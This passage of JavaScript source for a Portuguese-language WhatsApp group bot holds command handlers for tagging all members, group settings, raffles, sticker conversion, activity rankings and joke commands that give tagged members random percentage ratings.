else if (responsepm[0].status === "200") return reply(`𝙑𝙤𝙘𝙚 𝙥𝙚𝙧𝙙𝙚𝙪 𝙤 𝙘𝙖𝙧𝙜𝙤 𝙙𝙚 𝙖𝙙𝙢 𝙥𝙤𝙧 𝙢𝙤𝙩𝙞𝙫𝙤𝙨 𝙟𝙪𝙨𝙩𝙤, 𝙇𝙖𝙢𝙚𝙣𝙩𝙤 𝙫𝙤𝙘𝙚 𝙣𝙖𝙤 𝙚 𝙢𝙖𝙞𝙨 𝙖𝙙𝙢 𝙙𝙤 𝙜𝙧𝙪𝙥𝙤 😂`)
else if (responsepm[0].status === "404") return reply(' 𝙀𝙨𝙨𝙚 𝙪𝙨𝙪𝙖́𝙧𝙞𝙤 𝙣𝙖𝙤 𝙚𝙨𝙩𝙖́ 𝙣𝙤 𝙜𝙧𝙪𝙥𝙤 🤔 ')
else return reply('𝙩𝙚𝙣𝙩𝙚 𝙣𝙤𝙫𝙖𝙢𝙚𝙣𝙩𝙚 𝙥𝙤𝙧 𝙛𝙖𝙫𝙤𝙧')
break

case 'totag':
case 'cita':
case 'hidetag':
if(!isGroup) return reply('𝗘𝘀𝘁𝗲 𝗰𝗼𝗺𝗮𝗻𝗱𝗼 𝘀𝗼́ 𝗱𝗲𝘃𝗲 𝘀𝗲𝗿 𝘂𝘁𝗶𝗹𝗶𝘇𝗮𝗱𝗼 𝗲𝗺 𝗚𝗿𝘂𝗽𝗼.')
if (!isAdmins && !isCreator) return reply('𝗩𝗼𝗰𝗲̂ 𝗽𝗿𝗲𝗰𝗶𝘀𝗮 𝘀𝗲𝗿 𝗔𝗗𝗠 𝗽𝗿𝗮 𝘂𝘁𝗶𝗹𝗶𝘇𝗮𝗿 𝗲𝘀𝘁𝗲 𝗰𝗼𝗺𝗮𝗻𝗱𝗼')
membros = (groupId, membros1) => {
array = []
for (let i = 0; i < membros1.length; i++) {
array.push(membros1[i].id)
}
return array
}
var yd = membros(from, groupMembers)
if((isMedia && !m.message.videoMessage || isQuotedSticker) && args.length == 0) {
media = isQuotedSticker ? m.message.extendedTextMessage.contextInfo.quotedMessage.stickerMessage : m.message.stickerMessage
rane = getRandom('.'+await getExtension(media.mimetype))
img = await getFileBuffer(media, 'sticker')
fs.writeFileSync(rane,img)
fig = fs.readFileSync(rane)
var options = {
sticker: fig,  
mentions: yd
}
amy.sendMessage(from, options)
} else if ((isMedia && !m.message.videoMessage || isQuotedImage) && args.length == 0) {
media = isQuotedImage ? m.message.extendedTextMessage.contextInfo.quotedMessage.imageMessage : m.message.imageMessage
rane = getRandom('.'+await getExtension(media.mimetype))
img = await getFileBuffer(media, 'image')
fs.writeFileSync(rane,img)
buff = fs.readFileSync(rane)
amy.sendMessage(from, {image: buff, mentions: yd}, {quoted: info})
} else if ((isMedia && !m.message.videoMessage || isQuotedVideo) && args.length == 0) {
media = isQuotedVideo ? m.message.extendedTextMessage.contextInfo.quotedMessage.videoMessage : m.message.videoMessage
rane = getRandom('.'+await getExtension(media.mimetype))
vid = await getFileBuffer(media, 'video')
fs.writeFileSync(rane,vid)
buff = fs.readFileSync(rane)
amy.sendMessage(from, {video: buff, mimetype: 'video/mp4',mentions: yd}, {quoted: info})
} else if ((isMedia && !m.message.videoMessage || isQuotedAudio) && args.length == 0) {
media = isQuotedAudio ? m.message.extendedTextMessage.contextInfo.quotedMessage.audioMessage : m.message.audioMessage
rane = getRandom('.'+await getExtension(media.mimetype))
aud = await getFileBuffer(media, 'audio')
fs.writeFileSync(rane,aud)
buff = fs.readFileSync(rane)
amy.sendMessage(from, {audio: buff, mimetype: 'audio/mp4', ptt:true,mentions: yd}, {quoted: info})
} else if ((isMedia && !m.message.videoMessage || isQuotedDocument) && args.length == 0) {
media = isQuotedDocument ? m.message.extendedTextMessage.contextInfo.quotedMessage.documentMessage : m.message.documentMessage
rane = getRandom('.'+await getExtension(media.mimetype))
doc = await getFileBuffer(media, 'document')
fs.writeFileSync(rane,doc)
buff = fs.readFileSync(rane)
amy.sendMessage(from, {document: buff, mimetype : 'text/plain',mentions: yd},{quoted: info})
} else if(body){
if(q.length < 1) return reply('𝗗𝗶𝗴𝗶𝘁𝗲 𝗮𝗹𝗴𝗼 𝗼𝘂 𝗺𝗮𝗿𝗾𝘂𝗲 𝗮𝗹𝗴𝘂𝗺𝗮 𝗰𝗼𝗶𝘀𝗮 𝗽𝗮𝗿𝗮 𝗰𝗶𝘁𝗮𝗿.')
amy.sendMessage(from, {text: body.slice(command.length + 2), mentions: yd})
} else {
reply(`𝗥𝗲𝘀𝗽𝗼𝗻𝗱𝗲𝗿 𝗶𝗺𝗮𝗴𝗲𝗺/𝗱𝗼𝗰𝘂𝗺𝗲𝗻𝘁𝗼/𝗴𝗶𝗳/𝗳𝗶𝗴𝘂𝗿𝗶𝗻𝗵𝗮𝘀/𝗮́𝘂𝗱𝗶𝗼/𝘃𝗶́𝗱𝗲𝗼 𝗰𝗼𝗺 𝗹𝗲𝗴𝗲𝗻𝗱𝗮 ${prefix + command}`)
}
break


case 'status':
if (!isGroup) return reply(reply.msg.grupo)
if (!isAdmins && !isCreator  && !m.key.fromMe) return reply(msg.adm)
reply(`╭╸╸╸❲ 𝗦 𝗧 𝗔 𝗧 𝗨 𝗦 ❳╸╸╸╮
│➱ 𝗔𝗻𝘁𝗶𝗮𝘂𝗱𝗶𝗼: ${isAntiAudio? '✅' : '⛔'}
│➱ 𝗔𝗻𝘁𝗶𝗱𝗼𝗰: ${isAntidoc ? '✅' : '⛔'}
│➱ 𝗔𝗻𝘁𝗶𝗳𝗮𝗸𝗲: ${isAntifake ? '✅' : '⛔'}
│➱ 𝗔𝗻𝘁𝗶𝗶𝗺𝗴: ${isAntiImg? '✅' : '⛔'}
│➱ 𝗔𝗻𝘁𝗶𝘀𝘁𝗶𝗰𝗸𝗲𝗿: ${isAntiSticker ? '✅' : '⛔'}
│➱ 𝗔𝗻𝘁𝗶𝗻𝗼𝘁𝗮: ${isAntiNotas ? '✅' : '⛔'}
│➱ 𝗔𝗻𝘁𝗶𝗰𝗮𝘁𝗮𝗹𝗼𝗴𝗼: ${isAnticatalogo ? '✅' : '⛔'}
│➬ 𝗫𝟵𝘃𝗶𝘀𝘂𝘂𝗻𝗶𝗰𝗮: ${isX9VisuUnica ? '✅' : '⛔'}
│➱ 𝗔𝗻𝘁𝗶𝘃𝗶𝗱𝗲𝗼: ${isAntiVideo ? '✅' : '⛔'}
│➱ 𝗔𝗻𝘁𝗶𝗹𝗼𝗰: ${isAntiloc ? '✅' : '⛔'}
│➬𝗔𝗻𝘁𝗶𝗰𝘁𝘁: ${isAntiCtt ? '✅' : '⛔'}
│➬ 𝗔𝗻𝘁𝗶𝗹𝗶𝗻𝗸: ${isAntiLink ? '✅' : '⛔'}
│➱ 𝗔𝗻𝘁𝗶𝗹𝗶𝗻𝗸𝗴𝗽: ${isAntilinkgp ? '✅' : '⛔'}
│➱ 𝗔𝘂𝘁𝗼-𝗱𝗼𝘄𝗻: ${isAutoDown ? '✅' : '⛔'}
╰╸╸╸❲ ${botName} ❳╸╸╸╯`)
break



case "grupo":
if (!isGroup) return reply('Somente em grupos')
if (!isBotAdmins) return reply(`Preciso ser adm`)
if (!isAdmins) return reply('Somente adms')
try {
if (q == "a") {
await amy.groupSettingUpdate(from, "not_announcement")
reply("『Grupo aberto com sucesso』✅")
}
if (q == "f") {
await amy.groupSettingUpdate(from, "announcement")
reply("『Grupo fechado com sucesso』 ✅")
}
} catch(e) {
console.log(e)
reply(resposta.erro)
}
break



case 'sorteio':
try{
if(!isGroup) return reply(msg.grupo)
if(!q) return reply(`Coloque algo apos o comando`)
d = []
teks = `🎉 SORTEIO 🎉
PARABÉNS VOCE ACABOU DE GANHAR 🎉\nPREMIO: ${q}\nGANHADOR: `
for(i = 0; i < 1; i++) {
r = Math.floor(Math.random() * groupMetadata.participants.length + 0)
teks += `@${groupMembers[r].id.split('@')[0]}`
d.push(groupMembers[r].id)
}
mentions(teks, d, true)
} catch (e) {
console.log(e)
reply('Deu erro :/')
}
break

case 'x9visuunica':
if (!isGroup) return reply('Somente em grupos')
if (!isBotAdmins) return reply(`Preciso ser adm`)
if (!isAdmins) return reply('Somente adms')
if(args.length < 1) return reply(' 1 𝙥𝙧𝙖 𝙡𝙞𝙜𝙖𝙧 / 0 𝙥𝙧𝙖 𝙙𝙚𝙨𝙡𝙞𝙜𝙖𝙧')
if(Number(args[0]) === 1) {
if(isX9VisuUnica) return reply('𝙊 𝙧𝙚𝙘𝙪𝙧𝙨𝙤 𝙙𝙚 𝙧𝙚𝙫𝙚𝙡𝙖𝙧 𝙫𝙞𝙨𝙪 𝙪́𝙣𝙞𝙘𝙖 𝙟𝙖́ 𝙚𝙨𝙩𝙖́ 𝙖𝙩𝙞𝙫𝙖𝙙𝙤 👩🏻‍💻')
dataGp[0].visuUnica = true
setGp(dataGp)
setTimeout(() => {reagir(from, `✅`)}, 50)
reply('𝗔𝘁𝗶𝘃𝗼𝘂 𝗰𝗼𝗺 𝘀𝘂𝗰𝗲𝘀𝘀𝗼 𝗼 𝗿𝗲𝗰𝘂𝗿𝘀𝗼 𝗱𝗲 𝗿𝗲𝘃𝗲𝗹𝗮𝗿 𝘃𝗶𝘀𝘂 𝘂́𝗻𝗶𝗰𝗮 𝗻𝗲𝘀𝘁𝗲 𝗴𝗿𝘂𝗽𝗼 ✅')
} else if(Number(args[0]) === 0) {
if(!isX9VisuUnica) return reply(' 𝙊 𝙧𝙚𝙘𝙪𝙧𝙨𝙤 𝙙𝙚 𝙧𝙚𝙫𝙚𝙡𝙖𝙧 𝙫𝙞𝙨𝙪 𝙪́𝙣𝙞𝙘𝙖 𝙟𝙖́ 𝙚𝙨𝙩𝙖́ 𝙙𝙚𝙨𝙖𝙩𝙞𝙫𝙖𝙙𝙤 👩🏻‍💻 ')
dataGp[0].visuUnica = false
setGp(dataGp)
setTimeout(() => {reagir(from, `❌`)}, 50)
reply('𝘿𝙚𝙨𝙖𝙩𝙞𝙫𝙤𝙪 𝙘𝙤𝙢 𝙨𝙪𝙘𝙚𝙨𝙨𝙤 𝙤 𝙧𝙚𝙘𝙪𝙧𝙨𝙤 𝙙𝙚 𝙧𝙚𝙫𝙚𝙡𝙖𝙧 𝙫𝙞𝙨𝙪 𝙪́𝙣𝙞𝙘𝙖 𝙣𝙚𝙨𝙩𝙚 𝙜𝙧𝙪𝙥𝙤 ✅')
} else {
reply('𝟭 𝙥𝙖𝙧𝙖 𝙖𝙩𝙞𝙫𝙖𝙧, 𝟬 𝙥𝙖𝙧𝙖 𝙙𝙚𝙨𝙖𝙩𝙞𝙫𝙖𝙧')
}
break


case 'modogame':  
case 'modogamer':  
case 'Modogame':
if (!isGroup) return reply(msg.grupo)
if (!isAdmins) return reply(msg.adm)
if (args.length < 1) return reply('1 pra ativar / 0 pra desativar')
if (Number(args[0]) === 1) {
if (isModobn) return reply('Ja esta ativo no grupo')
modobn.push(from)
fs.writeFileSync('./arquivos/grupos/brincadeiras.json', JSON.stringify(modobn))
reply(`\`\`\`✓ Ativou com sucesso o modogame no grupo`)
} else if (Number(args[0]) === 0) {
if (!isModobn) return reply('Ja esta desativado')  
modobn.splice(from, 1)
fs.writeFileSync('./arquivos/grupos/brincadeiras.json', JSON.stringify(modobn))
reply(`\`\`\`✓ Desativou com sucesso no grupo`)
} else {
reply('1 pra ativar / 0 pra desativar')
}
break 


break

case 'resetarlink':
if (!isGroup) return reply('Somente em grupos')
if (!isBotAdmins) return reply(`Preciso ser adm`)
if (!isAdmins) return reply('Somente adms')
try {
await amy.groupRevokeInvite(from)
reply("𝙇𝙄𝙉𝙆 𝘿𝙊 𝙂𝙍𝙐𝙋𝙊 𝙍𝙀𝙎𝙀𝙏𝘼𝘿𝙊 𝘾𝙊𝙈 𝙎𝙐𝘾𝙀𝙎𝙎𝙊 ✅")
} catch(e) {
console.log(e)
reply(resposta.erro)
}
break





//╸╸╸╸╸╸╸╸𝙁𝙄𝙈 𝘾𝙈𝘿 𝘼𝘿𝙈╸╸╸╸╸╸╸╸╸

//FIGURINHAS 
case 'toimg':
if (!isQuotedSticker) return reply('𝙈𝙖𝙧𝙘𝙖 𝙪𝙢𝙖 𝙁𝙞𝙜𝙪𝙧𝙞𝙣𝙝𝙖!!')
buff = await getFileBuffer(info.message.extendedTextMessage.contextInfo.quotedMessage.stickerMessage, 'sticker')
try {
amy.sendMessage(from, {image: buff}, {quoted: info})
} catch(e) {
console.log(e)
reply('erro...')
}
break



case 'togif2':
if (!isQuotedSticker) return reply('𝗠𝗮𝗿𝗾𝘂𝗲 𝗮 𝗳𝗶𝗴𝘂𝗿𝗶𝗻𝗵𝗮 𝗮𝗻𝗶𝗺𝗮𝗱𝗮 !')
if (info.message?.extendedTextMessage?.contextInfo?.quotedMessage?.stickerMessage && info.message?.extendedTextMessage?.contextInfo?.quotedMessage?.stickerMessage?.isAnimated) {
let media = await downloadAndSaveMediaMessage(info.message?.extendedTextMessage?.contextInfo?.quotedMessage?.stickerMessage)
try {
reply('𝗔𝗴𝘂𝗮𝗿𝗱𝗲, 𝗰𝗼𝗻𝘃𝗲𝗿𝘁𝗲𝗻𝗱𝗼 𝗮 𝗳𝗶𝗴𝘂𝗿𝗶𝗻𝗵𝗮 𝗲𝗺 𝗴𝗶𝗳...')
a = await webp_mp42(media)
mp4 = await getBuffer(a.result)
amy.sendMessage(from, { video: mp4, gifPlayback: true, filename: `stick.gif` }, { quoted: info })
} catch {
reply('𝗘𝗿𝗿𝗼 𝗮𝗼 𝗰𝗼𝗻𝘃𝗲𝗿𝘁𝗲𝗿 𝗽𝗮𝗿𝗮 𝗴𝗶𝗳')
}
await fs.unlinkSync(media)
} else {
reply('𝗠𝗮𝗿𝗾𝘂𝗲 𝗮 𝗳𝗶𝗴𝘂𝗿𝗶𝗻𝗵𝗮 𝗮𝗻𝗶𝗺𝗮𝗱𝗮!')
}
break


case 'figurinha':
case 'f':
case 'fig':
case 's':
{
(async function () {
var legenda = q ? q?.split("/")[0] : `${pushname}`
if (isMedia && !info.message.videoMessage || isQuotedImage) {
var encmedia = isQuotedImage ? info.message.extendedTextMessage.contextInfo.quotedMessage.imageMessage : info.message.imageMessage
rane = getRandom('.'+await getExtension(encmedia.mimetype))
buffimg = await getFileBuffer(encmedia, 'image')
fs.writeFileSync(rane, buffimg)
rano = getRandom('.webp')
exec(`ffmpeg -i ${rane} -vcodec libwebp -filter:v fps=fps=15 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 800:800 ${rano}`, (err) => {
fs.unlinkSync(rane)
// "android-app-store-link": "https://play.google.com/store/search?q=%2B55%2094%209147-2796%20%F0%9F%94%A5%F0%9F%94%A5%F0%9F%94%A5%F0%9F%94%A5%F0%9F%94%A5&c=apps",
var json = {
"sticker-pack-name": legenda
}
var exifAttr = Buffer.from([0x49, 0x49, 0x2A, 0x00, 0x08, 0x00, 0x00, 0x00, 0x01, 0x00, 0x41, 0x57, 0x07, 0x00, 0x00, 0x00, 0x00, 0x00, 0x16, 0x00, 0x00, 0x00])
var jsonBuff = Buffer.from(JSON.stringify(json), "utf-8")
var exif = Buffer.concat([exifAttr, jsonBuff])
exif.writeUIntLE(jsonBuff.length, 14, 4)
let nomemeta = Math.floor(Math.random() * (99999 - 11111 + 1) + 11111)+".temp.exif"
fs.writeFileSync(`./${nomemeta}`, exif) 
exec(`webpmux -set exif ${nomemeta} ${rano} -o ${rano}`, () => {
amy.sendMessage(from, {sticker: fs.readFileSync(rano)}, {quoted: info})
DLT_FL(encmedia)
fs.unlinkSync(nomemeta)
fs.unlinkSync(rano)
})
})
} else if (isMedia && info.message.videoMessage.seconds < 11 || isQuotedVideo && info.message.extendedTextMessage.contextInfo.quotedMessage.videoMessage.seconds < 35) {
var encmedia = isQuotedVideo ? info.message.extendedTextMessage.contextInfo.quotedMessage.videoMessage : info.message.videoMessage
rane = getRandom('.'+await getExtension(encmedia.mimetype))
buffimg = await getFileBuffer(encmedia, 'video')
fs.writeFileSync(rane, buffimg)
rano = getRandom('.webp')
await ffmpeg(`./${rane}`)
.inputFormat(rane.split('.')[1])
exec(`ffmpeg -i ${rane} -vcodec libwebp -filter:v fps=fps=15 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 200:200 ${rano}`, (err) => {
fs.unlinkSync(rane)
let json = {
"sticker-pack-name": legenda
}
let exifAttr = Buffer.from([0x49, 0x49, 0x2A, 0x00, 0x08, 0x00, 0x00, 0x00, 0x01, 0x00, 0x41, 0x57, 0x07, 0x00, 0x00, 0x00, 0x00, 0x00, 0x16, 0x00, 0x00, 0x00])
let jsonBuff = Buffer.from(JSON.stringify(json), "utf-8")
let exif = Buffer.concat([exifAttr, jsonBuff])
exif.writeUIntLE(jsonBuff.length, 14, 4)
let nomemeta = "temp.exif"
fs.writeFileSync(`./${nomemeta}`, exif) 
exec(`webpmux -set exif ${nomemeta} ${rano} -o ${rano}`, () => {
amy.sendMessage(from, {sticker: fs.readFileSync(rano)}, {quoted: info})
DLT_FL(encmedia)
fs.unlinkSync(nomemeta)
fs.unlinkSync(rano)
})
})
} else {
reply(`Você precisa reply ou marcar uma imagem ou vídeo com no máximo 10 segundos`)
}
})().catch(e => {
console.log(e)
reply("Hmm deu erro")
try {
if (fs.existsSync("temp.exif")) fs.unlinkSync("temp.exif");
if (fs.existsSync(rano)) fs.unlinkSync(rano);
if (fs.existsSync(media)) fs.unlinkSync(media);
} catch {}
})
}
break
//╸╸╸╸╸╸╸╸ 𝙈𝙀𝙉𝙐 𝙅𝙊𝙂𝙊𝙎 ╸╸╸╸╸╸╸╸╸

case 'rankativos': 
case 'rankativo':   
reagir(from, "🏅") 
if(!isGroup) return reply(reply.msg.grupo)
var i3 = countMessage.map(i => i.groupId).indexOf(from)
var blue = countMessage[i3].numbers.map(i => i)
blue.sort((a, b) => ((a.figus == undefined ? a.figus = 0 : a.figus + a.messages + a.cmd_messages) < (b.figus == undefined ? b.figus = 0 : b.figus + b.cmd_messages + b.messages)) ? 0 : -1)
menc = [] 
blad = `*🏆 Rank dos mais ativos no grupo:* ${groupName}\n`
for ( i = 0; i < (blue.length < 5 ? blue.length : 5); i++) {
if (i != null) blad += `\n*🏅 ${i + 1}º Lugar:* @${blue[i].id.split('@')[0]}\n• 𝗠𝗲𝗻𝘀𝗮𝗴𝗲𝗻𝘀: *${blue[i].messages}*\n• 𝗖𝗼𝗺𝗮𝗻𝗱𝗼𝘀 𝗱𝗮𝗱𝗼𝘀: *${blue[i].cmd_messages}*\n• 𝗙𝗶𝗴𝘂𝗿𝗶𝗻𝗵𝗮𝘀 𝗲𝗻𝘃𝗶𝗮𝗱𝗮𝘀: *${blue[i].figus}*\n`
menc.push(blue[i].id)
}
amy.sendMessage(from, { image: { url: 'https://telegra.ph/file/3983278541166715dced3.jpg' }, caption: blad}, {quoted: info})
break


//╸╸╸╸╸╸╸╸╸╸𝘼𝙑𝘼𝙇𝙄𝘼𝙍╸╸╸╸╸╸╸╸╸╸

case 'corno': case 'corna':
if(!isModobn) return reply(`𝙊𝙡𝙖 ${pushname} 𝙀𝙨𝙩𝙚 𝙩𝙞𝙥𝙤 𝙙𝙚 𝙘𝙤𝙢𝙖𝙣𝙙𝙤 𝙨𝙤́ 𝙥𝙤𝙙𝙚 𝙨𝙚𝙧 𝙪𝙩𝙞𝙡𝙞𝙯𝙖𝙙𝙤 𝙘𝙤𝙢 𝙤 𝙢𝙤𝙙𝙤𝙗𝙧𝙞𝙣𝙘𝙖𝙙𝙚𝙞𝙧𝙖 𝙖𝙩𝙞𝙫𝙤, 𝙛𝙖𝙡𝙚 𝙘𝙤𝙢 𝙪𝙢 𝙖𝙙𝙢 𝙤𝙪 𝙨𝙚 𝙫𝙤𝙘𝙚̂ 𝙛𝙤𝙧, 𝙖𝙥𝙚𝙣𝙖𝙨 𝙙𝙞𝙜𝙞𝙩𝙚 ${prefix}𝙢𝙤𝙙𝙤𝙗𝙧𝙞𝙣𝙘𝙖𝙙𝙚𝙞𝙧𝙖 1 👩🏻‍💻`)   
if(!isGroup) return reply('Só pode ser utilizado este comando, em grupo.')
if(budy.includes("@")) {
mention_id = args.join(" ").replace("@", "") + "@s.whatsapp.net"
var blamention_id = mention_id
}
   
if(!budy.includes("@")) {
var blamention_id = sender 
}
amy.sendMessage(from, {text:` ❰ Pesquisando a sua ficha de corno(a) : @${blamention_id.split("@")[0]} aguarde... ❱`, mentions: [blamention_id]})
 setTimeout(async() => {
wew = await getBuffer(`${cornin}`)
random = `${Math.floor(Math.random() * 150)}`
await amy.sendMessage(from, {image: wew, caption: `• O quanto voce e corno(a) 🐂\n\n⧼ @${blamention_id.split("@")[0]} ⧽ voce é: ❰ ${random}% ❱ corno 🐃\n• Que isso 🙈`, gifPlayback: true, mentions: [blamention_id]}, {quoted: info})
}, 5000)
break 
case 'gado':
if(!isModobn) return reply(`𝙊𝙡𝙖 ${pushname} 𝙀𝙨𝙩𝙚 𝙩𝙞𝙥𝙤 𝙙𝙚 𝙘𝙤𝙢𝙖𝙣𝙙𝙤 𝙨𝙤́ 𝙥𝙤𝙙𝙚 𝙨𝙚𝙧 𝙪𝙩𝙞𝙡𝙞𝙯𝙖𝙙𝙤 𝙘𝙤𝙢 𝙤 𝙢𝙤𝙙𝙤𝙗𝙧𝙞𝙣𝙘𝙖𝙙𝙚𝙞𝙧𝙖 𝙖𝙩𝙞𝙫𝙤, 𝙛𝙖𝙡𝙚 𝙘𝙤𝙢 𝙪𝙢 𝙖𝙙𝙢 𝙤𝙪 𝙨𝙚 𝙫𝙤𝙘𝙚̂ 𝙛𝙤𝙧, 𝙖𝙥𝙚𝙣𝙖𝙨 𝙙𝙞𝙜𝙞𝙩𝙚 ${prefix}𝙢𝙤𝙙𝙤𝙗𝙧𝙞𝙣𝙘𝙖𝙙𝙚𝙞𝙧𝙖 1 👩🏻‍💻`)  
if(!isGroup) return reply('𝙎𝙤́ 𝙥𝙤𝙙𝙚 𝙨𝙚𝙧 𝙪𝙩𝙞𝙡𝙞𝙯𝙖𝙙𝙤 𝙚𝙨𝙩𝙚 𝙘𝙤𝙢𝙖𝙣𝙙𝙤, 𝙚𝙢 𝙜𝙧𝙪𝙥𝙤.')
if(budy.includes("@")) {
mention_id = args.join(" ").replace("@", "") + "@s.whatsapp.net"
var blamention_id = mention_id
}

if(!budy.includes("@")) {
var blamention_id = sender   
}
amy.sendMessage(from, {text:`❰ 𝙋𝙚𝙨𝙦𝙪𝙞𝙨𝙖𝙣𝙙𝙤 𝙖 𝙛𝙞𝙘𝙝𝙖 𝙙𝙚 𝙜𝙖𝙙𝙤 : @${blamention_id.split("@")[0]}, 𝙖𝙜𝙪𝙖𝙧𝙙𝙚... ❱`, mentions: [blamention_id]})
 setTimeout(async() => {
wew = await getBuffer(`${gadin}`)
random = `${Math.floor(Math.random() * 110)}`
await amy.sendMessage(from, {image: wew, caption: `𝙊 𝙦𝙪𝙖𝙣𝙩𝙤 𝙫𝙤𝙘𝙚̂ 𝙚́ 𝙜𝙖𝙙𝙤? \n\n「 @${blamention_id.split("@")[0]} 」𝙑𝙤𝙘𝙚̂ 𝙚́: ❰ ${random}% ❱  𝙜𝙖𝙙𝙤(𝙖) 🐂`, mentions: [blamention_id]}, {quoted: info})
}, 5000)
break 

case 'bonita':
if(!isModobn) return reply(`𝙊𝙡𝙖 ${pushname} 𝙀𝙨𝙩𝙚 𝙩𝙞𝙥𝙤 𝙙𝙚 𝙘𝙤𝙢𝙖𝙣𝙙𝙤 𝙨𝙤́ 𝙥𝙤𝙙𝙚 𝙨𝙚𝙧 𝙪𝙩𝙞𝙡𝙞𝙯𝙖𝙙𝙤 𝙘𝙤𝙢 𝙤 𝙢𝙤𝙙𝙤𝙗𝙧𝙞𝙣𝙘𝙖𝙙𝙚𝙞𝙧𝙖 𝙖𝙩𝙞𝙫𝙤, 𝙛𝙖𝙡𝙚 𝙘𝙤𝙢 𝙪𝙢 𝙖𝙙𝙢 𝙤𝙪 𝙨𝙚 𝙫𝙤𝙘𝙚̂ 𝙛𝙤𝙧, 𝙖𝙥𝙚𝙣𝙖𝙨 𝙙𝙞𝙜𝙞𝙩𝙚 ${prefix}𝙢𝙤𝙙𝙤𝙗𝙧𝙞𝙣𝙘𝙖𝙙𝙚𝙞𝙧𝙖 1 👩🏻‍💻`)   
if(!isGroup) return reply('Só pode ser utilizado este comando, em grupo.')
if(budy.includes("@")) {
mention_id = args.join(" ").replace("@", "") + "@s.whatsapp.net"
var blamention_id = mention_id
}

if(!budy.includes("@")) {
var blamention_id = sender 
}
amy.sendMessage(from, {text:` ❰ Pesquisando a sua ficha de bonita : @${blamention_id.split("@")[0]} aguarde... ❱`, mentions: [blamention_id]})
 setTimeout(async() => {
wew = await getBuffer(`${bonita}`)
random = `${Math.floor(Math.random() * 150)}`
await amy.sendMessage(from, {image: wew, caption: `• O quanto voce e bonita 💖\n\n⧼ @${blamention_id.split("@")[0]} ⧽ voce é: ❰ ${random}% ❱ bonita 😍\n• Que isso ta linda 🙈`, gifPlayback: true, mentions: [blamention_id]}, {quoted: info})
}, 5000)
break 

case 'gada':
if(!isModobn) return reply(`𝙊𝙡𝙖 ${pushname} 𝙀𝙨𝙩𝙚 𝙩𝙞𝙥𝙤 𝙙𝙚 𝙘𝙤𝙢𝙖𝙣𝙙𝙤 𝙨𝙤́ 𝙥𝙤𝙙𝙚 𝙨𝙚𝙧 𝙪𝙩𝙞𝙡𝙞𝙯𝙖𝙙𝙤 𝙘𝙤𝙢 𝙤 𝙢𝙤𝙙𝙤𝙗𝙧𝙞𝙣𝙘𝙖𝙙𝙚𝙞𝙧𝙖 𝙖𝙩𝙞𝙫𝙤, 𝙛𝙖𝙡𝙚 𝙘𝙤𝙢 𝙪𝙢 𝙖𝙙𝙢 𝙤𝙪 𝙨𝙚 𝙫𝙤𝙘𝙚̂ 𝙛𝙤𝙧, 𝙖𝙥𝙚𝙣𝙖𝙨 𝙙𝙞𝙜𝙞𝙩𝙚 ${prefix}𝙢𝙤𝙙𝙤𝙗𝙧𝙞𝙣𝙘𝙖𝙙𝙚𝙞𝙧𝙖 1 👩🏻‍💻`)   
if(!isGroup) return reply('Só pode ser utilizado este comando, em grupo.')
if(budy.includes("@")) {
mention_id = args.join(" ").replace("@", "") + "@s.whatsapp.net"
var blamention_id = mention_id
}

if(!budy.includes("@")) {
var blamention_id = sender 
}
amy.sendMessage(from, {text:` ❰ Pesquisando a sua ficha de gada : @${blamention_id.split("@")[0]} aguarde... ❱`, mentions: [blamention_id]})
 setTimeout(async() => {
wew = await getBuffer(`${gada}`)
random = `${Math.floor(Math.random() * 150)}`
await amy.sendMessage(from, {image: wew, caption: `• O quanto voce e gada 🐄\n\n⧼ @${blamention_id.split("@")[0]} ⧽ voce é: ❰ ${random}% ❱ gada 🐄\n• Que isso ksks 🙈`, gifPlayback: true, mentions: [blamention_id]}, {quoted: info})
}, 5000)
break 

case 'bebado':
if(!isModobn) return reply(`𝙊𝙡𝙖 ${pushname} 𝙀𝙨𝙩𝙚 𝙩𝙞𝙥𝙤 𝙙𝙚 𝙘𝙤𝙢𝙖𝙣𝙙𝙤 𝙨𝙤́ 𝙥𝙤𝙙𝙚 𝙨𝙚𝙧 𝙪𝙩𝙞𝙡𝙞𝙯𝙖𝙙𝙤 𝙘𝙤𝙢 𝙤 𝙢𝙤𝙙𝙤𝙗𝙧𝙞𝙣𝙘𝙖𝙙𝙚𝙞𝙧𝙖 𝙖𝙩𝙞𝙫𝙤, 𝙛𝙖𝙡𝙚 𝙘𝙤𝙢 𝙪𝙢 𝙖𝙙𝙢 𝙤𝙪 𝙨𝙚 𝙫𝙤𝙘𝙚̂ 𝙛𝙤𝙧, 𝙖𝙥𝙚𝙣𝙖𝙨 𝙙𝙞𝙜𝙞𝙩𝙚 ${prefix}𝙢𝙤𝙙𝙤𝙗𝙧𝙞𝙣𝙘𝙖𝙙𝙚𝙞𝙧𝙖 1 👩🏻‍💻`)   
if(!isGroup) return reply('Só pode ser utilizado este comando, em grupo.')
if(budy.includes("@")) {
mention_id = args.join(" ").replace("@", "") + "@s.whatsapp.net"
var blamention_id = mention_id
}

if(!budy.includes("@")) {
var blamention_id = sender 
}
amy.sendMessage(from, {text:`❰ Pesquisando a ficha de bebado : @${blamention_id.split("@")[0]} , aguarde... ❱`, mentions: [blamention_id]})
 setTimeout(async() => {
wew = await getBuffer(`${bebin}`)
random = `${Math.floor(Math.random() * 110)}`
await amy.sendMessage(from, {image: wew, caption:`O quanto você é bebado? \n\n「 @${blamention_id.split("@")[0]} 」Você é: ❰ ${random}% ❱ Bêbado 🤢🥵🥴`, mentions: [blamention_id]}, {quoted: info})
}, 7000)
break

case 'vesgo':
